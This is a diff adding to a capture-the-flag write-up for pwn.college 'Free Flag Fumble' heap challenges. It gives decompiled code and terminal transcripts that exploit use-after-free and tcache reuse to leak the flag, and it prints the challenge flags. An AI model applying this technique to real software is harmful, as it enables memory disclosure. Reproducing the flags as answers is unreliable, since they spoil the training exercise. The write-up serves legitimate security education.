@@ -563,3 +563,271 @@ Data: pwn.college{su9bnqD-UlklEnJ8xjHEtaBKtSJ.0FN3MDL4ITM0EzW}
 &nbsp;
 
 ## Free Flag Fumble (Easy)
+
+```
+hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
+###
+### Welcome to /challenge/free-flag-fumble-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, the flag buffer is allocated 2 times before it is used.
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x59c50bb2c2c0
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x59c50bb2c4b0
+[*] read the flag!
+```
+
+This time the `read_flag` function reads the flag twice into buffers of size `480` bytes.
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
+###
+### Welcome to /challenge/free-flag-fumble-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, the flag buffer is allocated 2 times before it is used.
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x562a9e54c2c0
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x562a9e54c4b0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Index: 0
+
+Size: 480
+
+[*] allocations[0] = malloc(480)
+[*] allocations[0] = 0x562a9e54c6a0
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Index: 1
+
+Size: 480
+
+[*] allocations[1] = malloc(480)
+[*] allocations[1] = 0x562a9e54c890
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+Index: 0
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 1     | HEAD: 0x562a9e54c6a0       | KEY: 0x562a9e54c010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+Index: 1
+
+[*] free(allocations[1])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 2     | HEAD: 0x562a9e54c890       | KEY: 0x562a9e54c010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x562a9e54c890      | 0                   | 0x1f1 (P)                    | 0x562a9e54c6a0      | 0x562a9e54c010      |
+| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x562a9e54c890
+[*] flag_buffer = malloc(480)
+[*] flag_buffer = 0x562a9e54c6a0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/read_flag/quit): puts
+
+Index: 0
+
+[*] puts(allocations[0])
+Data: pwn.college{4d96a3J7Ce0XBHbjqikTX4-jo2e.0VN3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/read_flag/quit): quit
+
+### Goodbye!
+```
+
+&nbsp;
+
+## Free Flag Fumble (Hard)
+
+```
+hacker@dynamic-allocator-misuse~free-flag-fumble-hard:/$ /challenge/free-flag-fumble-hard 
+###
+### Welcome to /challenge/free-flag-fumble-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+```
+
+As always, the hard challenge does not tell us the size of the buffers into which the flag was read.
+
+### Binary Analysis
+
+```c title="/challenge/free-flag-fumble-hard :: main()"
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // ecx
+  int i; // [rsp+24h] [rbp-12Ch]
+  unsigned int index_1; // [rsp+28h] [rbp-128h]
+  unsigned int index; // [rsp+28h] [rbp-128h]
+  unsigned int v8; // [rsp+28h] [rbp-128h]
+  unsigned int size; // [rsp+2Ch] [rbp-124h]
+  void *size_4; // [rsp+30h] [rbp-120h]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-8h]
+
+  v13 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          puts(byte_2020);
+          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_2020);
+          if ( strcmp(choice, "malloc") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_2020);
+          index_1 = atoi(choice);
+          if ( index_1 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 60u, "main");
+          printf("Size: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_2020);
+          size = atoi(choice);
+          ptr[index_1] = malloc(size);
+        }
+        if ( strcmp(choice, "free") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_2020);
+        index = atoi(choice);
+        if ( index > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 76u, "main");
+        free(ptr[index]);
+      }
+      if ( strcmp(choice, "puts") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", choice);
+      puts(byte_2020);
+      v8 = atoi(choice);
+      if ( v8 > 0xF )
+        __assert_fail("allocation_index < 16", "<stdin>", 88u, "main");
+      printf("Data: ");
+      puts((const char *)ptr[v8]);
+    }
+    if ( strcmp(choice, "read_flag") )
+      break;
+    for ( i = 0; i <= 1; ++i )
+      size_4 = malloc(957uLL);
+    v3 = open("/flag", 0);
+    read(v3, size_4, 128uLL);
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+We can see that on making the `read_flag` choice, the program allocates two buffers of size `957` bytes.
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~free-flag-fumble-hard:~$ /challenge/free-flag-fumble-hard 
+###
+### Welcome to /challenge/free-flag-fumble-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Index: 0
+
+Size: 957
+
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Index: 1
+
+Size: 957
+
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+Index: 0
+
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+Index: 1
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+
+[*] Function (malloc/free/puts/read_flag/quit): puts
+
+Index: 0
+
+Data: pwn.college{8Wq-xUWLolH-kpTT9mLLl4qgFmM.0lN3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/read_flag/quit): quit
+
+### Goodbye!
+```
